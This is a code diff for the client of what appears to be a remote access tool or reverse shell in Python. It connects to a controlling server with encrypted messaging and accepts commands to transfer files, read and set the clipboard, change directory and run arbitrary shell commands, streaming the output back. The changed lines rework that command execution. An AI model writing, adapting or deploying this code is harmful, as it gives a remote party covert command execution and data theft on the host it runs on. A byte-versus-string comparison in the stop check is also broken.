@@ -1,12 +1,11 @@
 import logging
 import os
 import pickle
-import signal
 import socket
 import subprocess
 import time
-from multiprocessing import Process, Queue
 
+import psutil
 import pyperclip
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
@@ -68,7 +67,6 @@ def decrypt(privateKey, ciphertext):
     )
     return plaintext
 
-
 def public_bytes(publicKey):
     serializedPublic = publicKey.public_bytes(
         encoding=serialization.Encoding.PEM,
@@ -76,17 +74,11 @@ def public_bytes(publicKey):
     )
     return serializedPublic
 
-
-def shell(q, data):
-    try:
-        cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        q.put(output_bytes.decode(errors="replace"))
-    except Exception as e:
-        # TODO: Error description is lost
-        q.put("Command execution unsuccessful: %s" %str(e))
-    return
+def kill(proc_pid):
+    process = psutil.Process(proc_pid)
+    for proc in process.children(recursive=True):
+        proc.kill()
+    process.kill()
 
 
 class Client(object):
@@ -102,10 +94,6 @@ class Client(object):
 
         self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
         self.publicKey = self.privateKey.public_key()
-
-        self.Threads = []
-        self.q = Queue()
-        self.WAIT_TIME = 10
 
     def socket_create(self):
         """ Create a socket """
@@ -181,38 +169,13 @@ class Client(object):
         self.socket.recv(1024)
         self.socket.send(encrypted)
 
-    def threads(self):
-        return_threads = "Threads:\n\n"
-        for thr in self.Threads:
-            if thr[0].is_alive():
-                return_threads += "PID: {} - {}".format(thr[0].pid, thr[1])
-            else:
-                self.Threads.remove(thr)
-        return return_threads
-
-    def kill_thread(self, PID):
-        try:
-            PID = int(PID)
-        except:
-            return 'PID has to be a integer'
-        for thr in self.Threads:
-            if thr[0].is_alive():
-                if thr[0].pid == PID:
-                    thr[0].terminate()
-                    return "Killed PID:{} Successfully".format(str(PID))
-            else:
-                self.Threads.remove(thr)
-        return "PID ({}) already killed".format(str(PID))
-
     def receive_commands(self):
         while True:
             data = self.receive()
             if data == b'<LIST>':
                 self.socket.send(b' ')
                 continue
-            if data == b'<THREADS>':
-                self.send(self.threads().encode())
-                continue
+
             if data == b'<SEND>':
                 self.send(b'<READY>')
                 packed_data = self.receive()
@@ -224,11 +187,11 @@ class Client(object):
                 self.send(b'File Transfer Successful')
                 continue
 
-
             if data == b'<COPY>':
                 self.send(b'<READY>')
                 pyperclip.copy(self.receive().decode())
                 self.send(b'<READY>')
+                continue
 
 
             if data == b'<PASTE>':
@@ -245,10 +208,6 @@ class Client(object):
                     self.send(f.read())
                 continue
 
-            if b'<KILL>' in data:
-                self.send(self.kill_thread(data.decode().split(' ')[-1]).encode())
-                continue
-
             if data.decode()[:2].lower() == 'cd':
                 try:
                     directory = data.decode()[3:]
@@ -259,15 +218,19 @@ class Client(object):
                 continue
 
             if len(data) > 0:
-                self.Threads.append((Process(target=shell, args=(self.q, data)), data))
-                self.Threads[-1][0].daemon = True
-                self.Threads[-1][0].start()
-                self.Threads[-1][0].join(self.WAIT_TIME)
-                if self.Threads[-1][0].is_alive():
-                    self.send(b"Command took too long... Will keep running in background.")
-                else:
-                    self.send(self.q.get().encode())
-                    self.Threads.pop(-1)
+                if data == b'tree':
+                    data = b'tree /A'
+                print(data)
+                process = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                for line in iter(process.stdout.readline, ""):
+                    if line == b'':
+                        break
+                    print(line)
+                    self.send(line.replace(b'\n', b''))
+                    if self.receive() == '--q':
+                        kill(process.pid)
+                        break
+                self.send(b'<DONE>')
                 continue
 
 def main():
@@ -285,7 +248,6 @@ def main():
     except Exception as e:
         logging.critical('Error in main: {}'.format(str(e)))
     
-
 
 if __name__ == '__main__':
     while 1:
